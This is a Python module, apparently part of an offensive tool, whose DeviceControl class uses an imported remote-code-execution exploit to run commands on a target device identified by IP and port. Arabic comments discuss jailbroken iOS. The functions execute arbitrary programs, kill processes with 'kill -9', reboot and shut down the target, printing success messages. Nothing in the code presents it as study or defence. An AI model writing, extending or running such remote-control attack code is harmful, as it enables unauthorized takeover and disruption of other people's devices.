from rich.console import Console
from rich.prompt import Prompt, IntPrompt
from rce_exploit import RCEExploit

console = Console()

class DeviceControl:
    @staticmethod
    def execute(ip, port, program):
        """Execute a program on the target device."""
        try:
            # في iOS العادي، لا يمكن تنفيذ برامج خارجية بسبب قيود الأمان
            # يمكن استخدام URL Schemes لفتح تطبيقات محددة
            # مع Jailbreak: يمكن تنفيذ البرامج مباشرة
            command = f"{program}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][Device] Program {program} executed successfully[/bold green]")
                console.print("[bold yellow][Device] Note: In non-jailbroken iOS, program execution is restricted. Consider using URL Schemes instead.[/bold yellow]")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][Device] Failed to execute program: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Device] Program execution error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def kill(ip, port, pid):
        """Kill a process by PID."""
        try:
            # أمر kill متوافق مع iOS مع Jailbreak
            # في iOS العادي، لا يمكن إنهاء عمليات أخرى بسبب قيود الأمان
            command = f"kill -9 {pid}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][Device] Process {pid} killed successfully[/bold green]")
                console.print("[bold yellow][Device] Note: In non-jailbroken iOS, killing processes is restricted.[/bold yellow]")
                return {'status': 'success'}
            else:
                console.print(f"[bold red][Device] Failed to kill process: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Device] Process kill error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def reboot(ip, port):
        """Reboot the target device."""
        try:
            # في iOS العادي، لا يمكن إعادة تشغيل الجهاز برمجياً بسبب قيود الأمان
            # مع Jailbreak: يمكن استخدام ldrestart بدلاً من reboot
            command = "ldrestart || reboot"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][Device] Device reboot initiated[/bold green]")
                console.print("[bold yellow][Device] Note: In non-jailbroken iOS, rebooting programmatically is restricted.[/bold yellow]")
                return {'status': 'success'}
            else:
                console.print(f"[bold red][Device] Failed to reboot device: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Device] Reboot error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def shutdown(ip, port):
        """Shutdown the target device."""
        try:
            # في iOS العادي، لا يمكن إيقاف تشغيل الجهاز برمجياً بسبب قيود الأمان
            # مع Jailbreak: يمكن استخدام halt أو poweroff
            command = "halt || poweroff"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][Device] Device shutdown initiated[/bold green]")
                console.print("[bold yellow][Device] Note: In non-jailbroken iOS, shutting down programmatically is restricted.[/bold yellow]")
                return {'status': 'success'}
            else:
                console.print(f"[bold red][Device] Failed to shutdown device: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Device] Shutdown error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}
